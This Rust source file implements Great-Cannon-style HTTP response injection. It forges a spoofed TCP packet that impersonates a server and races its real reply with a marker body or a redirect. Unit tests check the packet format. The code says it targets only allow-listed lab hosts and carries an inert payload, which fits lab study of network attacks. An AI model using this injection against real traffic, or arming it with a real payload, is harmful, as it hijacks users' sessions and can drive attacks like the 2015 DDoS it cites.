// Great-Cannon-style response injection: forge a plaintext HTTP response that
// races the real server's reply, substituting the body for a marker string
// and/or a redirect. The real Great Cannon (Citizen Lab, 2015) weaponizes a
// captured requester's browser against an unrelated third party (the 2015
// GitHub DDoS). This only ever fires between two hosts on config/cannon.yml's
// own-lab allow-list, and the injected body is inert -- a marker string
// and/or a redirect to another host you own, never a real payload.
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{checksum as ipv4_checksum, Ipv4Flags, MutableIpv4Packet};
use pnet::packet::tcp::{ipv4_checksum as tcp_checksum, MutableTcpPacket, TcpFlags};
use std::net::{IpAddr, Ipv4Addr};

const IP_HDR_LEN: usize = 20;
const TCP_HDR_LEN: usize = 20;

/// Build the plaintext HTTP response body: a visible marker, plus a redirect
/// (302 + Location) if configured. "Both" is answerable -- a 302 can still
/// carry a body, most browsers just don't render it; curl/`--trace` will.
pub fn build_http_response(marker: &str, redirect: Option<&str>) -> Vec<u8> {
    let status = match redirect {
        Some(_) => "302 Found",
        None => "200 OK",
    };
    let mut headers = format!("HTTP/1.1 {status}\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n", marker.len());
    if let Some(url) = redirect {
        headers.push_str(&format!("Location: {url}\r\n"));
    }
    headers.push_str("\r\n");
    let mut buf = headers.into_bytes();
    buf.extend_from_slice(marker.as_bytes());
    buf
}

/// Build a spoofed IPv4/TCP PSH+ACK packet carrying `payload`, appearing to
/// come from `src` (the real server), sent to `dst` (the real client).
fn build_response(src: Ipv4Addr, src_port: u16, dst: Ipv4Addr, dst_port: u16, seq: u32, ack: u32, payload: &[u8]) -> Vec<u8> {
    let total_len = IP_HDR_LEN + TCP_HDR_LEN + payload.len();
    let mut buf = vec![0u8; total_len];

    {
        let mut tcp = MutableTcpPacket::new(&mut buf[IP_HDR_LEN..]).unwrap();
        tcp.set_source(src_port);
        tcp.set_destination(dst_port);
        tcp.set_sequence(seq);
        tcp.set_acknowledgement(ack);
        tcp.set_data_offset(5);
        tcp.set_flags(TcpFlags::PSH | TcpFlags::ACK);
        tcp.set_window(65535);
        tcp.set_payload(payload);
        let cksum = tcp_checksum(&tcp.to_immutable(), &src, &dst);
        tcp.set_checksum(cksum);
    }

    {
        let mut ip = MutableIpv4Packet::new(&mut buf).unwrap();
        ip.set_version(4);
        ip.set_header_length(5);
        ip.set_total_length(total_len as u16);
        ip.set_ttl(64);
        ip.set_flags(Ipv4Flags::DontFragment);
        ip.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip.set_source(src);
        ip.set_destination(dst);
        let cksum = ipv4_checksum(&ip.to_immutable());
        ip.set_checksum(cksum);
    }

    buf
}

/// Send the forged response, impersonating `server` speaking to `client`.
/// `server_seq` is the next byte the real server would send (from the
/// reverse flow's tracked ISN + bytes delivered so far); `client_seq_after`
/// is the client's next unsent byte (what the server would ack).
#[allow(clippy::too_many_arguments)]
pub fn inject_response(
    tx: &mut pnet::transport::TransportSender,
    server: Ipv4Addr,
    server_port: u16,
    client: Ipv4Addr,
    client_port: u16,
    server_seq: u32,
    client_seq_after: u32,
    payload: &[u8],
) -> std::io::Result<()> {
    let raw = build_response(server, server_port, client, client_port, server_seq, client_seq_after, payload);
    tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&raw).unwrap(), IpAddr::V4(client)).map(|_| ())
}

#[cfg(test)]
mod tests {
    use super::*;
    use pnet::packet::ipv4::Ipv4Packet;
    use pnet::packet::tcp::TcpPacket;
    use pnet::packet::Packet;

    #[test]
    fn response_body_has_marker_and_no_redirect() {
        let body = build_http_response("test-marker", None);
        let text = String::from_utf8(body).unwrap();
        assert!(text.starts_with("HTTP/1.1 200 OK"));
        assert!(text.ends_with("test-marker"));
        assert!(!text.contains("Location:"));
    }

    #[test]
    fn response_body_has_marker_and_redirect() {
        let body = build_http_response("test-marker", Some("http://10.27.0.10/demo"));
        let text = String::from_utf8(body).unwrap();
        assert!(text.starts_with("HTTP/1.1 302 Found"));
        assert!(text.contains("Location: http://10.27.0.10/demo\r\n"));
        assert!(text.ends_with("test-marker"));
    }

    #[test]
    fn injected_packet_is_well_formed() {
        let server = Ipv4Addr::new(10, 27, 0, 10);
        let client = Ipv4Addr::new(10, 27, 0, 5);
        let payload = build_http_response("hi", None);
        let raw = build_response(server, 80, client, 51234, 1000, 2000, &payload);

        let ip = Ipv4Packet::new(&raw).unwrap();
        assert_eq!(ip.get_source(), server);
        assert_eq!(ip.get_destination(), client);
        let mut recompute = ip.packet().to_vec();
        recompute[10] = 0;
        recompute[11] = 0;
        assert_eq!(ipv4_checksum(&Ipv4Packet::new(&recompute).unwrap()), ip.get_checksum());

        let tcp = TcpPacket::new(ip.payload()).unwrap();
        assert_eq!(tcp.get_source(), 80);
        assert_eq!(tcp.get_destination(), 51234);
        assert_eq!(tcp.get_sequence(), 1000);
        assert_eq!(tcp.get_acknowledgement(), 2000);
        assert_eq!(tcp.get_flags(), TcpFlags::PSH | TcpFlags::ACK);
        assert_eq!(tcp.payload(), payload.as_slice());
        let cksum = tcp_checksum(&tcp, &server, &client);
        assert_eq!(cksum, tcp.get_checksum());
    }
}
